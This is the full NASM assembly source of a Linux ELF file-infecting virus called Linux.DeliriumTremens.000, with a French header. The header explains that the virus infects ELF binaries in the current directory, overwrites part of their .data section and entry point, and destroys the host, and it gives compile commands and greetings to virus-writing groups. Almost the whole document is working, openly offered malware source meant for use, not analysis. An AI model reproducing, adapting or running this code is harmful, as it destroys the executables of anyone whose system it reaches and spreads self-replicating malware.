;----------------------------------------------------
;
;                Linux.DeliriumTremens.000 by Emper0r
;                ____________________________________
;
;
;
;Just a another lame virus ...
;
;
;Le Delirium Tremens est une 'maladie' lié à la suspension brutale de
;l'intoxication a l'alcool, des symptômes mineurs initiaux peuvent apparaître
;6 à 8 heures après la dernière absorption. Cette 'maladie' provoque
;agitation, état confusionnel, hallucinations, tremblement rapide,
;trouble du sommeil, signes neuro-végétatifs (sudation, fièvre, tachycardie ..)
;
;
;La Delirium Tremens est aussi une bière trés bonne (oupss j'ai fait d'la pub )
;
;
;Linux.DeliriumTremens.000 est un petit virus capable d'infecter tout les elfs
;du répertoire courant du moment que ceux ci on une section .data plus
;importante que son code.
;
;Linux.DeliriumTremens.000 est un virus a écrasement il est DESTRUCTEUR, la
;section .data ou du moins une parti est écrasée et l'hote ne fonctionne plus
;du tout, il est irrémédiablement détruit.
;
;Si vous voulez le tester alors faite le seulement sur votre propre bécane en
;connaissant les risques encouru...
;
;Remerciement:
;	- A tous ceux qui participent et/ou soutiennent la IOC.
;	- La team 29A et tout particulièrement SnakeByte et Mandragore
;	- Tous les vxers bien taré et bien sympa que l'on retrouve dans certains
;         coin obscur de l'IRC :)
;
;
;Pour compiler ca :
;nasm -f elf DeliriumTremens.asm
;cc DeliriumTremens.o -o DeliriumTremens
;(compiler sous linux avec un kernell 2.4.18)
;
;"He who makes a beast of himself gets arid of the pain of being a man"
;
;


section .data           ;Le code de la souche est aussi dans la .data

main :
debutvirus:	        ;


mov eax, 5              ;ouverture
push 0x2E               ;0x2E= '.' astuce pour pas utiliser de buffer
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80

sub esp, 0x10000        ;recup de la place sur la pile, 64ko
                        ;juste pour les noms
mov ebx, eax
mov eax, 220            ;getdents
mov ecx, esp            ;buffer_résultat dans esp
mov edx, 0x10000        ;taille
int 0x80

mov ebp, 16             ;premier nom en ebp + 3



lol:
mov ebx, ebp
add ebx, 3              ;esp + 3 = première lettre du nom
jmp fouverture          ;j'aurai du le remplacer par un call mais j'ai
                        ;déja assez de manip sur la pile(voir la suite)


arf:
mov ecx, ebp            ;test si plus de fichier dans le buf
mov dl, byte [esp + ecx]
cmp dl, 0
je bye                  ;plus de fichier alors casse toi
add ecx, edx            ;sinon ajoute le prochain décalage
mov ebp, ecx            ;on le sauve
jmp lol                 ;et on passe au suivant



fermeture:
mov eax, 6              ;on ferme le fichier ouvert
int 0x80                ;
jmp arf                 ;on va ce préparé a repartir avec un nouveau fichier



bye:
mov eax, 4              ;affiche la signature
mov ebx, 1

call @@@                ;permet de récupéré eip
@@@:                    ;dans ecx, une fois infecter les
pop ecx                 ;labels ne fonctionneront plus

add ecx, 0xDD           ;notre signature ce trouve 0xDD plus loin
mov edx, 38             ;longueur de la signature
int 0x80

mov eax, 1              ;c'est fini on stoppe tout
mov ebx, 0
int 0x80



fouverture:             ;ouverture du fichier
mov eax, 5
add ebx, esp
mov ecx, 2
xor edx, edx
int 0x80


cmp ah, 0xFF            ;teste si on a pu l'ouvrir
je arf                  ;sinon on va ce préparé pour un nouveau fichier

push eax                ;met le file descriptor sur la pile
pop ebx                 ;recup le FD

call sysread            ;lecture des 4 premiers octet du fichier

cmp eax, 0x464C457F     ;test si elf
jne fermeture           ;sinon on ce casse

mov ecx, 0x20
call syslseek           ;lseek sur e_shoff (section header offset)
call sysread            ;lecture de e_shoff
push eax                ;sauvegarde de e_shoff

mov ecx, eax

add ecx, 0x26C          ;on ce place sur sh_size .data
call syslseek           ;"
call sysread            ;on lit sh_size (section header size)
pop ecx                 ;on récupère e_shoff ici, sinon pb de déséquilibre pile
cmp eax, finvirus - debutvirus  ;si pas la place de mettre le code viral dans
jl fermeture            ;.data alors on ce casse

add ecx, 0x268          ;on ce place sur sh_offset de .data
call syslseek           ;"
call sysread            ;on lit sh_offset .data

mov ecx, eax
push ecx                ;sauve sh_offset .data

call syslseek           ;on ce place au début de .data pour écrire

mov eax, 4              ;écriture :)
call cocaïne            ;Toujours pareil on recup eip dans ecx
cocaïne:                ;car les labels seront 'détruits' dans les
pop ecx                 ;fichiers infecter
sub ecx, 0xEB           ;début du code viral en eip - 0xEB
mov edx, finvirus - debutvirus    ;nb d'octet a écrire, pas de pbs de label ici
int 0x80

mov ecx, 0x18           ;adresse de e_entry (Entry point)
call syslseek           ;lseek sur e_entry

écriture:
mov eax, 4
pop ecx                 ;ecx = sh_offset .data
add ecx, 0x8049000      ;ajout du virtual offset
push ecx
mov ecx, esp            ;petite astuce
pop edx                 ;rééquilibre la pile avec un octet
mov edx, 4
int 0x80

jmp fermeture



sysread:                ;FD dans ebx, les 4 octet lu sont récupéré dans eax
mov eax, 3              ;sys_call read
sub esp, 4              ;on ce pend 4 octet sur la pile
mov ecx, esp            ;buffer sur la pile
mov edx, 4
int 0x80
pop eax                 ;résultat dans eax
ret



syslseek:       ;il faut le fd dans ebx, et le déplacement dans ecx
                ;déplacement a partir du début du fichier
mov eax, 19
xor edx, edx
int 0x80
ret



signature db 'Linux.DeliriumTremens.000 By Emper0r',10,13,
finvirus:
;----------------------------------------------------
